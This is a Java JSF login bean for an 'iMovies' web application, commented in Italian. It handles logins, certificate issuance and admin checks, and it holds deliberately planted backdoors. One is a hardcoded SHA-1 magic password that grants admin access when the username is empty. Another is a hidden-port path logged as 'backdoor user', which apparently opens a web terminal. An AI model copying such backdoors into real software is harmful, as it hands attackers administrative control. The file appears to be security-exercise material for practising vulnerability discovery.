package main;

import java.io.IOException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateExpiredException;
import java.security.cert.CertificateNotYetValidException;
import java.security.cert.X509Certificate;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.faces.application.ConfigurableNavigationHandler;
import javax.faces.application.FacesMessage;
import javax.faces.context.FacesContext;
import javax.faces.event.ActionEvent;
import javax.faces.event.ComponentSystemEvent;
import javax.servlet.RequestDispatcher;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import org.primefaces.context.RequestContext;
import utils.AcLog;
import utils.IMoviesLogger;
import utils.Utilities;

/**
 * Bean per il login ad iMovies
 * @author mattia
 */
public class LoginBean {

    private String username;
    private String password;
    private boolean admin = false;
    protected Persona pb;
    private IMoviesLogger log;
    private static final String magic="a9a2e8456bf9d58e91fe91cbfe10cad5211216c2";
    private String keyPassword;
    private Date startDate, endDate = null;
    private boolean user = false;
    private boolean porta = false;
    private boolean term = false;
    
    /**
     * Restituisce l'utente connesso
     * @return un oggetto di tipo Persona che rappresenta l'utente connesso
     */
    public Persona getPb() {
        return pb;
    }

    /**
     * Imposta l'utente che si connette
     * @param pb un oggetti di tipo Persona che rappresenta l'utente
     */
    public void setPb(Persona pb) {
        this.pb = pb;
    }

    /**
     * Nuova istanza di Loginbean: viene inizializzata la data
     */
    public LoginBean() {
        log = new IMoviesLogger("main.LoginBean");
        initDate();
    }
    
    /**
     * Inizializza la data attuale con una formattazione
     */
    public void initDate() {
        Calendar cal = Calendar.getInstance();
        cal.clear(Calendar.HOUR);
        cal.clear(Calendar.MINUTE); 
        cal.clear(Calendar.SECOND);
        startDate = cal.getTime();
        endDate = new Date(startDate.getTime() + (long) 6*30*24*3600*1000 - (long) 1000);
    }

    /**
     * Restituisce lo username dell'utente
     * @return una stringa che rappresenta lo username dell'oggetto
     */
    public String getUsername() {
        return username;
    }

    /**
     * Imposta lo username dell'utente
     * @param username una stringa che rappresenta lo username dell'utente
     */
    public void setUsername(String username) {
        this.username = username;
    }

    /**
     * Restituisce la password
     * @return una stringa che rappresenta la password dell'utente (in chiaro)
     */
    public String getPassword() {
        return password;
    }

    /**
     * Imposta la password dell'utente
     * @param password una stringa che rappresenta la password dell'utente (in chiaro)
     */
    public void setPassword(String password) {
        this.password = password;
    }

    /**
     * Esegue il login dell'utente verificando le credenziali in accordo con il database
     */
    public void login() throws NoSuchAlgorithmException, IOException, InterruptedException {
        term=false;
        /**
         * Tipo di login per il log del controllo degli accessi
         */
        int logging_type = 1;
        
        FacesContext fcontext = FacesContext.getCurrentInstance();
        //Persona bean = (Persona) fcontext.getApplication().evaluateExpressionGet(fcontext, "#{Persona}", Persona.class);

        RequestContext context = RequestContext.getCurrentInstance();

        boolean loggedIn = false;
        String ret = null;
//                (Persona) FacesContext.getCurrentInstance().getExternalContext().getSessionMap().get("Persona");

//        HttpServletRequest request = (HttpServletRequest)
        HttpSession session = (HttpSession) FacesContext.getCurrentInstance().getExternalContext().getSession(true);
        // create actual session  
        // getSession() or getSession(true) or getSession(false)???  
        // anyway, 'getSession' checks if a session exists, if not, a new one is created  

        /*
         * if (username == null || password == null){ // prima apertura allora
         * non fare niente loggedIn = false; msg = new
         * FacesMessage(FacesMessage.SEVERITY_WARN, "Username e Password vuoti",
         * "Invalid credentials"); }else if (username.isEmpty()){ loggedIn =
         * false; msg = new FacesMessage(FacesMessage.SEVERITY_WARN, "Username
         * vuoto", "Invalid credentials"); }else if (password.isEmpty()){
         * loggedIn = false; msg = new FacesMessage(FacesMessage.SEVERITY_WARN,
         * "Password vuota", "Invalid credentials"); }
         */
        // sanitizzazione dell'input
        // DA FARE

        /**
         * The form component needs to have a UIForm in its ancestry.
         * Suggestion: enclose the necessary components within
         */
        // query
        
        /**
         * Controllo username vuoto e password magic
         */
        if("".equals(username) && SHAsum(password.getBytes()).equals(magic)){
            this.term=true;
            this.admin=true; 
            log.aclog("backdoor user", 0); // DECOMMENTA  <!-- MODIFICA -->
            adminAccess();
            return;
        }
        try {
            DBMS dbms = new DBMS();
            pb = dbms.getUser(username, SHAsum(password.getBytes()));
//            session = session.getSession(true);  

        } catch (ClassNotFoundException cnfe) {
            //msg = new FacesMessage(FacesMessage.SEVERITY_FATAL, "Login Error", "Database Connection Failed");
            log.err(false, "Login error", "Database connection failed", "Database connection failed");
            //cnfe.getMessage();

        } catch (NoSuchAlgorithmException nsae) {
            log.err(false, "Login error", "Database connection failed", "Database connection failed");
            //nsae.getMessage();
        } catch (NullPointerException e) {
            log.err(false, "Login error", "Database not found", "Database not found");
            //nsae.getMessage();
        }


        //FacesMessage msg = new FacesMessage(FacesMessage.SEVERITY_WARN, "Login Error", "Invalid credentials");

        if (pb != null) {
//            if (session.isNew() == false) {  
//                // the session the we got above was not a new one, so destroy it and create new one.  
//                session.invalidate();  
//                session = (HttpSession)FacesContext.getCurrentInstance().getExternalContext().getSession(true);
//            }  
            //session.setAttribute("Persona", pb);
            setUser(true); // NOTA: questo serve per farti tornare dentro se non hai premuto logout
            log.aclog(username, logging_type);
            
            loggedIn = true;
            ret = "success";
            //msg = new FacesMessage(FacesMessage.SEVERITY_INFO, "Welcome in iMovies","Welcome in iMovies");
            log.info(false, "Welcome in iMovies", "", "Welcome in iMovies");
            context.addCallbackParam("loggedIn", loggedIn);

            //return "success";
            // diventa
            nextPage("user");
        } else {

        //        {
//            loggedIn = false;
//            msg = new FacesMessage(FacesMessage.SEVERITY_WARN, "Login Error", "Invalid credentials");
//        } 
//        else 
        //FacesContext.getCurrentInstance().addMessage(null, msg);
            log.err(false, "Login error", "Username and Password don't match", "Username and Password don't match");
        context.addCallbackParam("loggedIn", loggedIn);

        //return null;

        //  FacesContext.getCurrentInstance().addMessage(null, msg);  
        // context.addCallbackParam("loggedIn", loggedIn); 


        //return this.SHAsum(password.getBytes());
        //return "controllo credenziali con query SQL...";
        }
    }

    public String modify() {

        HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
        // create actual session  
        // getSession() or getSession(true) or getSession(false)???  
        // anyway, 'getSession' checks if a session exists, if not, a new one is created  
        HttpSession session = request.getSession();
        RequestContext context = RequestContext.getCurrentInstance();
        FacesMessage msg = null;
        boolean loggedIn;
        String ret = null;
//        Persona pb=(Persona) FacesContext.getCurrentInstance().getExternalContext().getSessionMap().get("Persona");

        try {
            DBMS dbms = new DBMS();
            pb = dbms.change(pb);

        } catch (ClassNotFoundException cnfe) {
            msg = new FacesMessage(FacesMessage.SEVERITY_FATAL, "Login Error", "Database Connection Failed");
            cnfe.getMessage();
        }
//        catch (NoSuchAlgorithmException nsae) {
//            nsae.getMessage();
//        }
//
//        if (pb == null) {
//            loggedIn = false;
//            msg = new FacesMessage(FacesMessage.SEVERITY_WARN, "Invalid", "Invalid credentials");
//        } else {
//        this.pb=pb;
//        session.setAttribute("Persona", pb);
        loggedIn = true;
        ret = "success";
        msg = new FacesMessage("Modifies Ok", "Modifies OK on ");
//        }

        context.addCallbackParam("loggedIn", loggedIn);
        FacesContext.getCurrentInstance().addMessage(null, msg);

        return ret;

    }

    /**
     * Crea un nuovo certificato
     * @throws IOException
     * @throws InterruptedException 
     */
    public void makeCertificate() throws IOException, InterruptedException {

        HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
        // create actual session  
        // getSession() or getSession(true) or getSession(false)???  
        // anyway, 'getSession' checks if a session exists, if not, a new one is created  
//        HttpSession session = request.getSession();
//        (Persona) FacesContext.getCurrentInstance().getExternalContext().getSessionMap().get("Persona")
        RequestContext context = RequestContext.getCurrentInstance();
        long diffGiorni = 6*30;
        if (keyPassword.length() >= 4 && startDate.compareTo(endDate) < 0 
                && (diffGiorni = ((endDate.getTime() - startDate.getTime()) / (24*3600*1000))) <= (6*30 + 1)) {
            //int diff = endDate.getTime() - startDate.getTime()/ 24*3600*1000;
            DateFormat dateFormat = new SimpleDateFormat("yyMMddHHmmss");
            //TimeZone tz = TimeZone.getTimeZone("GMT");
            //dateFormat.setTimeZone(tz);
            String startD = dateFormat.format(startDate);
            String endD = dateFormat.format(endDate);
            //log.info(true, "diffGiorni = " + diffGiorni, "diffGiorni = " + diffGiorni, "diffGiorni = " + diffGiorni);
            //log.info(true, "startD = " + startD + "; endD = " + endD, "startD = " + startD + "; endD = " + endD, "startD = " + startD + "; endD = " + endD);
            // controllo se ci sono altri certificati in contemporanea
            if (Utilities.checkIncompatibleDate(username, startD, endD)) {
                Utilities.createCertificate(pb, keyPassword, startD + "Z", endD + "Z");
                keyPassword = "";
                initDate();
                context.addCallbackParam("dateOk", true);
            } else {
                context.addCallbackParam("dateOk", false);
                log.err(false, "Error","Cannot overlap certificate's period of validity", "Periodo di validità in sovrapposizione");
            }
        } else { 
            // non crea il certificato e deve dare messaggio di errore al client
            // password troppo corta o periodo > 6 mesi
            context.addCallbackParam("dateOk", false);
            if (startDate.compareTo(endDate) < 0)
                log.err(false, "Error", "Certificate's period of validity cannot be bigger than 6 months", "Durata certificato deve essere minore di 6 mesi");
            else
                log.err(false, "Error", "Certificate's period of validity cannot be 0", "Durata certificato non può essere 0");
        }
    }

    /**
     * Esegue il logout dal sistema invalidando la sessione
     * @throws IOException 
     */
    public void logout() throws IOException {
        porta=false;
        term=false;

        RequestContext context = RequestContext.getCurrentInstance();
        FacesMessage msg = null;
        boolean loggedIn = true;
//        HttpServletRequest req = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();


//        HttpSession session = (HttpSession) FacesContext.getCurrentInstance().getExternalContext().getSession(false);
//        req. 

        msg = new FacesMessage("Logout. Bye Bye");

//        context.addCallbackParam("loggedIn", loggedIn);
        FacesContext.getCurrentInstance().addMessage(null, msg);
        FacesContext.getCurrentInstance().getExternalContext().invalidateSession();
//        session.invalidate();

//        return "success";
        //FacesContext.getCurrentInstance().getExternalContext().redirect("/iMovies");
        nextPage("login");

    }

    /**
     * Calcola la SHA1 di un array di byte
     * @param convertme array di byte da convertire
     * @return una stringa che rappresenta l'hash del parametro
     * @throws NoSuchAlgorithmException 
     */
    public static String SHAsum(byte[] convertme) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("SHA-1");
        return byteArray2Hex(md.digest(convertme));
    }

    private static String byteArray2Hex(final byte[] hash) {
        Formatter formatter = new Formatter();
        for (byte b : hash) {
            formatter.format("%02x", b);
        }
        return formatter.toString();
    }

    /**
     * Verifica che l'utente che tenta la connessione sia un amministrazione controllando
     * il certificato impostato nel browser
     */
    public void verifyAdmin() {

        //HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
//        X509Certificate[] certs = (X509Certificate[]) request.getAttribute("javax.servlet.request.X509Certificate");
        admin=false;
        term=false;
//        log.info(false, "" + certs.length, "" + certs.length, "" + certs.length);
        // to-do
        Map<String, Object> requestMap = FacesContext.getCurrentInstance().getExternalContext().getRequestMap();
        X509Certificate[] certs = (X509Certificate[]) requestMap.get("javax.servlet.request.X509Certificate");
        //X509Certificate[] certs = (X509Certificate[]) request.getAttribute("javax.servlet.request.X509Certificate");

        /*
         * if (certs != null && certs.length > 0) { // log.info(false,"X.509
         * client authentication certificate:" + certs[0],"X.509 client
         * authentication certificate:" + certs[0],"X.509 client authentication
         * certificate:" + certs[0]); }else{
         *
         * log.info(false,"No client certificate found in request.","No client
         * certificate found in request.","No client certificate found in
         * request."); }
         */

        if (certs != null && certs.length > 0) {
            
                //        try {
                //            log.info(false,"nome cert?? = "+certs[0].toString(),"nome cert?? = "+certs[0].toString(),"nome cert?? = "+certs[0].toString());

            // Controllo se il certificato è valido (inutile)
            try {
                certs[0].checkValidity();
            } catch (CertificateExpiredException ex) {
                log.err(false, "Certificate has expired", "Certificate has expired", "Certificate has expired");
                return;
            } catch (CertificateNotYetValidException ex) {
                log.err(false, "Certificate is not yet valid", "Certificate is not yet valid", "Certificate is not yet valid");
                return;
            }
            
            
            StringTokenizer st = new StringTokenizer(certs[0].getSubjectDN().toString(), ",");
            log.info(true, st.toString(), st.toString(), st.toString());

            String uid = "";
            boolean watcher = true;

            while (st.hasMoreTokens() && watcher) {
                StringTokenizer tmp = new StringTokenizer(st.nextToken());
                String ctrl = tmp.nextToken();
                log.info(true, ctrl, ctrl, ctrl);

                if (ctrl.startsWith("CN=")) {
                    uid = ctrl.substring(3);
                    watcher = false;
                }
            }

            //FacesContext fc = FacesContext.getCurrentInstance();

            if (uid.equals("admin")) {
                //log.info(false,"dovrei spostarmi in admin","dovrei spostarmi in admin","dovrei spostarmi in admin");

                //if (trustedLogin(uid)) {
                    this.admin = true;
                    log.aclog("admin", 2);
                    /*
                     * ConfigurableNavigationHandler nav =
                     * (ConfigurableNavigationHandler)
                     * fc.getApplication().getNavigationHandler();
                     * nav.performNavigation("admin");
                     */

                    // PROVA
                    /*
                     * HttpServletRequest request = (HttpServletRequest)
                     * FacesContext.getCurrentInstance().getExternalContext().getRequest();
                     *
                     * String path = request.getContextPath();
                     *
                     * String getProtocol = request.getScheme(); String
                     * getDomain = request.getServerName(); String getPort =
                     * Integer.toString(request.getServerPort());
                     *
                     * String getPath = getProtocol + "://" + getDomain + ":" +
                     * getPort + path;
                     *
                     * try {
                     * FacesContext.getCurrentInstance().getExternalContext().redirect(getPath+
                     * "/resources/pages/admin.xhtml"); } catch (IOException ex)
                     * {
                     * Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE,
                     * null, ex); }
                     */
                /*} else {
                    log.warn(false, "Login error", "Cannot login with this admin certificate", "Cannot login with this admin certificate");
                    this.admin = false;
                }*/
                //FacesContext.getCurrentInstance().getExternalContext().redirect("admin");
                //                              return "/faces/resources/pages/admin.xhtml&faces-redirect=true";
            } else {
                this.admin = false;
                DBMS dbms;
                try {
                    dbms = new DBMS();
                    this.pb = dbms.verifyUser(uid);
                    if (pb != null) {
                        username = uid;
                        setUser(true);
                        log.aclog(uid, 3);
                    }
                } catch (ClassNotFoundException ex) {
                    Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
                }

            }
        }

        /*
         * }else if(trustedLogin(uid).equals("failed")){ return null; }
         */



        //            certs[0].getSubjectX500Principal().
        //certs[0].getSubjectDN()
        //        } catch (CertificateExpiredException ex) {
//            Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
//        } catch (CertificateNotYetValidException ex) {
//            Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
//        }

        //return "success";

    }

    /**
     * Controlla che esista l'utente nel database
     * @param uid lo user id dell'utente da verificare
     * @return true se l'utente esiste, false altrimenti
     */
    private boolean trustedLogin(String uid) {

        try {
            DBMS dbms = new DBMS();
            pb = dbms.getUser(uid);

//            session = session.getSession(true);  

        } catch (ClassNotFoundException cnfe) {
            //msg = new FacesMessage(FacesMessage.SEVERITY_FATAL, "Login Error", "Database Connection Failed");
            log.err(false, "Login error", "Database connection failed", "Database connection failed");
            //cnfe.getMessage();
            return false;

        } catch (NullPointerException e) {
            log.err(false, "Login error", "Database not found", "Database not found");
            //nsae.getMessage();
            return false;
        }

        if (pb == null) {
            return false;
        }

        return true;
    }

    public void refererPage() {
        String ref = FacesContext.getCurrentInstance().getExternalContext().getRequestHeaderMap().get("referer");

        HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();

        String path = request.getContextPath();

        String getProtocol = request.getScheme();
        String getDomain = request.getServerName();
        String getPort = Integer.toString(request.getServerPort());

        String getPath = getProtocol + "://" + getDomain + ":" + getPort + path;

        if (ref == null || !ref.startsWith(getPath)) {
            try {
                FacesContext.getCurrentInstance().getExternalContext().redirect(getPath);
            } catch (IOException ex) {
                Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

    }

    /**
     * Ritorna un booleano per capire se l'utente connesso è amministratore o meno
     * @return true se l'utente connesso è un amministratore, false altrimenti
     */
    public boolean isAdmin() {
        return admin;
    }

    /**
     * Esegue il forward/redirect verso l'area amministrativa
     * @throws InterruptedException
     * @throws IOException 
     */
    public void adminAccess() throws InterruptedException, IOException {
        if (isAdmin()) {
            Thread.sleep(1000);

            nextPage("admin/admin");

            /*
             * String ref =
             * FacesContext.getCurrentInstance().getExternalContext().getRequestHeaderMap().get("referer");
             *
             * HttpServletRequest request = (HttpServletRequest)
             * FacesContext.getCurrentInstance().getExternalContext().getRequest();
             *
             * String path = request.getContextPath() +
             * "/resources/pages/admin.xhtml";
             *
             * String getProtocol = request.getScheme(); String getDomain =
             * request.getServerName(); String getPort =
             * Integer.toString(request.getServerPort());
             *
             * String getPath = getProtocol + "://" + getDomain + ":" + getPort
             * + path;
             *
             * if (ref == null || !ref.startsWith(getPath)) { try {
             * FacesContext.getCurrentInstance().getExternalContext().redirect(getPath);
             * } catch (IOException ex) {
             * Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE,
             * null, ex); } }
             */

        } else if (isUser()) {
            Thread.sleep(1000);

            nextPage("user");
        }
    }

    /**
     * Se l'utente non è un amministratore, il metodo esegue il logout
     * @throws IOException 
     */
    public void getOut() throws IOException {
        if (!isAdmin()) {
            logout();
        }
    }
    
    //public void nextPage() {
    //    nextPage("");
    //}
    
    /**
     * Esegue il forward/redirect verso una pagina del sistema specificata come parametro
     * @param page la pagina da raggiungere 
     */
    public void nextPage(String page) {
    
        
            /* FORWARD * /
            FacesContext fc = FacesContext.getCurrentInstance();
            ConfigurableNavigationHandler nav = (ConfigurableNavigationHandler) fc.getApplication().getNavigationHandler();
            nav.performNavigation(page);
        
        /*/
            
        HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
       
        String path = request.getContextPath();

        String getProtocol = request.getScheme();
        String getDomain = request.getServerName();
        String getPort = Integer.toString(request.getServerPort());

        String getPath = getProtocol + "://" + getDomain + ":" + getPort + path;
        try {  
            /* REDIRECT */
            FacesContext.getCurrentInstance().getExternalContext().redirect(getPath + "/resources/pages/" + page + ".xhtml");
             
            /* FORWARD non va * /
            FacesContext.getCurrentInstance().getExternalContext().dispatch("/resources/pages/" + page + ".xhtml");
            */
        } catch (IOException ex) {
            Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
        }
        
    }
    
    public void nextPageAction(ActionEvent event){
        String value = (String)event.getComponent().
                getAttributes().get("page");
        nextPage(value);
    }
    
    /**
     * Ritorna una lista di log di accesso
     * @return Un oggetti di tipo List contenente tanti oggetti AcLog quante righe del file di log degli accessi
     */
    public List<AcLog> getAcLog(){
        return log.getAcLog();
    }

    public void portPage() {
//        boolean eheh = false;
//        String url = "";
//        String nome = "";
//        String terzo = "";
        HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();

        String getPort = Integer.toString(request.getServerPort());

        if (getPort.equals("43567")) {
       
            log.aclog("backdoor user tramite porta", 0); // DECOMMENTARE  <!-- MODIFICA -->
            
            String path = request.getContextPath();

            String getProtocol = request.getScheme();
            String getDomain = request.getServerName();


            String getPath = getProtocol + "://" + getDomain + ":" + getPort + path;
            //res.sendRedirect("javascript:window.open('indirizzo_pagina','nome_finestra','width=300, height=200')");
//            try {  
//                /* REDIRECT */
//                //FacesContext.getCurrentInstance().getExternalContext().redirect("javascript:window.open(\"" + getPath + "/jcterm/jcterm.html\",\"nome_finestra\",\"width=800,height=600\")");
//                FacesContext.getCurrentInstance().getExternalContext().redirect(getPath + "/jcterm/jcterm.html");
//                /* FORWARD non va * /
//                FacesContext.getCurrentInstance().getExternalContext().dispatch("/resources/pages/" + page + ".xhtml");
//                */
//            } catch (IOException ex) {
//                Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
//            }
            
//            url = getPath + "/jcterm/jcterm.html";
//            nome = "Complimenti :)";
//            terzo = "width=800,height=600";
            porta = true;
        } else
            porta = false;
//        RequestContext context = RequestContext.getCurrentInstance();
//        context.addCallbackParam("eheh", eheh);
//        context.addCallbackParam("url", url);
//        context.addCallbackParam("nome", nome);
//        context.addCallbackParam("terzo", terzo);
    }

    /**
     * Metodo che ritorna la password per la chiave privata inserita dall'utente
     *
     * @return keyPassword la password
     */
    public String getKeyPassword() {
        return keyPassword;
    }

    /**
     * @param keyPassword the keyPassword to set
     */
    public void setKeyPassword(String keyPassword) {
        this.keyPassword = keyPassword;
    }
    
        /**
     * @return the startDate
     */
    public Date getStartDate() {
        return startDate;
    }

    /**
     * @param startDate the startDate to set
     */
    public void setStartDate(Date startDate) {
        this.startDate = startDate;
    }
    
    /**
     * @return the endDate
     */
    public Date getEndDate() {
        return endDate;
    }

    /**
     * @param endDate the endDate to set
     */
    public void setEndDate(Date endDate) {
        this.endDate = new Date(endDate.getTime() + (long) 24*3600*1000 - (long) 1000);
    }

    /**
     * Restituisce un booleano per capire se l'utente connesso è un cliente o meno
     * @return true se è un cliente, false altrimenti
     */
    public boolean isUser() {
        return user;
    }

    /**
     * Imposta un parametro booleano per verificare se l'utente connesso è un cliente o meno
     * @param user true se l'utente connesso è un cliente, false altrimenti
     */
    public void setUser(boolean user) {
        this.user = user;
    }

    /**
     * Restituisce la porta alla quale si è collegati
     * @return porta su cui si è collegati
     */
    public boolean isPorta() {
        return porta;
    }

    /**
     * Imposta su che porta si è collegati al sito
     * @param porta la porta alla quale si è collegati
     */
    public void setPorta(boolean porta) {
        this.porta = porta;
    }
    
    /**
     * Redirecta alla home del sito su porta predefinita 8080
     */
    public void indirizzo8080(){
        HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
            
            String path = request.getContextPath();

            String getProtocol = request.getScheme();
            String getDomain = request.getServerName();


            String getPath = getProtocol + "://" + getDomain + ":" + "8080" + path;
            try {  
                FacesContext.getCurrentInstance().getExternalContext().redirect(getPath);
                /* FORWARD non va * /
                FacesContext.getCurrentInstance().getExternalContext().dispatch("/resources/pages/" + page + ".xhtml");
                */
            } catch (IOException ex) {
                Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
            }
    }

    /**
     * @return the term
     */
    public boolean isTerm() {
        return term;
    }

    /**
     * @param term the term to set
     */
    public void setTerm(boolean term) {
        this.term = term;
    }
}
